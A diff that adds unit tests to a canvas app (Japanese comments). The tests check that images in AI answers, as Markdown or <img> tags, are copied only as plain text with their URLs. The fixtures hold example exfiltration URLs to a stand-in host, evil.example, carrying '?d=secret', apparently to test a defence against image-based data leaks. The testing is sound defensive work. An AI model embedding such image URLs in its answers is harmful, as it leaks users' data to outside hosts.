@@ -429,6 +429,33 @@ describe('placeAnswerText', () => {
   })
 })
 
+// AI の答えを写すとき、外の画像を写さない（説明と URL の文字にする。docs/question-canvas-tools-plan.md の B）
+describe('copying an answer to the canvas', () => {
+  const image = '![グラフ](https://evil.example/p.png?d=secret)'
+  const answer = `答えです。\n\n${image}\n\n<img src="https://evil.example/q?d=secret" alt="図">`
+  const plain = '画像「グラフ」（https://evil.example/p.png?d=secret）'
+
+  it('「Canvasに残す」のテキストに、画像の Markdown を写さない', () => {
+    const editor = new Editor()
+    const id = placeAnswerText(editor, answer, { center: { x: 0, y: 0 } })!
+    const text = plainTextOf((editor.getNode(id)! as NodeRecord<TextProps>).props.paragraphs)
+    expect(text).not.toContain('![')
+    expect(text).not.toContain('<img')
+    expect(text).toContain(plain)
+    expect(text).toContain('画像「図」（https://evil.example/q?d=secret）')
+  })
+
+  it('付箋に添える答えの写し（付箋に切り出す・続けて聞く）にも、画像を写さない。質問の文はそのまま', () => {
+    const context = chatContext({ threadId: 't1', jobId: 'j1', title: '題', question: `質問 ${image}`, answer, previous: [{ question: 'Q', answer: image }] })
+    expect(context.turns).toEqual([
+      { question: 'Q', answer: plain },
+      { question: `質問 ${image}`, answer: `答えです。\n\n${plain}\n\n画像「図」（https://evil.example/q?d=secret）` },
+    ])
+    const meta = { contexts: [], answer: { body: answer, related: [], model: 'm', question: 'Q2', answeredAt: 1 } }
+    expect(followUpContext('node:me', 'canvas:me', meta)!.turns.at(-1)!.answer).not.toContain('![')
+  })
+})
+
 describe('waitUntilIdle', () => {
   it('waits while a transaction is open, and returns when it closes or when aborted', async () => {
     const editor = new Editor()
